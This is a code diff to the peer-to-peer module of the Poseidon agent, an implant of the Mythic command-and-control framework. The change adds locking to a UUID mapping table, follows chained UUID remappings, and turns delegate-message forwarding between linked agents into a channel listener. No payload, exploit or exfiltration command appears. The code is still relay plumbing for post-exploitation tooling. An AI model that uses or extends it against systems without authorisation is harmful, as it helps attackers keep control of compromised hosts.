@@ -1,16 +1,20 @@
 package p2p
 
 import (
+	"sync"
+
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
 
 var (
-	uuidMappings                    = make(map[string]string)
-	availableP2P                    = make(map[string]structs.P2PProcessor)
-	RemoveInternalConnectionChannel = make(chan structs.RemoveInternalConnectionMessage, 5)
-	AddInternalConnectionChannel    = make(chan structs.AddInternalConnectionMessage, 5)
+	uuidMappings                                          = make(map[string]string)
+	uuidMappingsSync                                      = sync.Mutex{}
+	availableP2P                                          = make(map[string]structs.P2PProcessor)
+	RemoveInternalConnectionChannel                       = make(chan structs.RemoveInternalConnectionMessage, 5)
+	AddInternalConnectionChannel                          = make(chan structs.AddInternalConnectionMessage, 5)
+	HandleDelegateMessageForInternalP2PConnectionsChannel = make(chan []structs.DelegateMessage, 100)
 )
 
 // registerAvailableP2P marks a new internal P2P tracker as available
@@ -30,32 +34,42 @@ func GetInternalP2PMap() string {
 
 // getInternalConnectionUUID converts a random UUID into a proper MythicUUID for delegate messages via P2P
 func getInternalConnectionUUID(oldUUID string) string {
-	if newUUID, ok := uuidMappings[oldUUID]; ok {
-		return newUUID
+	uuidMappingsSync.Lock()
+	defer uuidMappingsSync.Unlock()
+	latestUUID := oldUUID
+	for {
+		if newUUID, ok := uuidMappings[latestUUID]; ok {
+			latestUUID = newUUID
+		} else {
+			break
+		}
 	}
-	return oldUUID
+	return latestUUID
 }
 
 // addInternalConnectionUUID adds a key/value pair to the internal uuidMappings
 func addInternalConnectionUUID(key string, value string) {
+	uuidMappingsSync.Lock()
+	defer uuidMappingsSync.Unlock()
 	uuidMappings[key] = value
 }
 
-// HandleDelegateMessageForInternalP2PConnections forwards delegate messages to the right TCP connections
+// listenHandleDelegateMessageForInternalP2PConnections forwards delegate messages to the right TCP connections
 // A delegate message is coming in from some egress section and we need to forward it to the right connected agent
-func HandleDelegateMessageForInternalP2PConnections(delegates []structs.DelegateMessage) {
-	for i := 0; i < len(delegates); i++ {
-		//fmt.Printf("HTTP's HandleInternalDelegateMessages going to linked node: %v\n", delegates[i])
-		// check to see if this message goes to something we know about
-
-		if _, ok := availableP2P[delegates[i].C2ProfileName]; ok {
-			// Mythic told us that our UUID is wrong and there's a different one to use
-			if delegates[i].MythicUUID != "" && delegates[i].MythicUUID != delegates[i].UUID {
-				addInternalConnectionUUID(delegates[i].UUID, delegates[i].MythicUUID)
+func listenHandleDelegateMessageForInternalP2PConnections() {
+	for {
+		delegates := <-HandleDelegateMessageForInternalP2PConnectionsChannel
+		for i := 0; i < len(delegates); i++ {
+			//fmt.Printf("HTTP's HandleInternalDelegateMessages going to linked node: %v\n", delegates[i])
+			// check to see if this message goes to something we know about
+			if _, ok := availableP2P[delegates[i].C2ProfileName]; ok {
+				// Mythic told us that our UUID is wrong and there's a different one to use
+				if delegates[i].MythicUUID != "" && delegates[i].MythicUUID != delegates[i].UUID {
+					addInternalConnectionUUID(delegates[i].UUID, delegates[i].MythicUUID)
+				}
+				availableP2P[delegates[i].C2ProfileName].ProcessIngressMessageForP2P(&delegates[i])
 			}
-			availableP2P[delegates[i].C2ProfileName].ProcessIngressMessageForP2P(&delegates[i])
 		}
-
 	}
 }
 
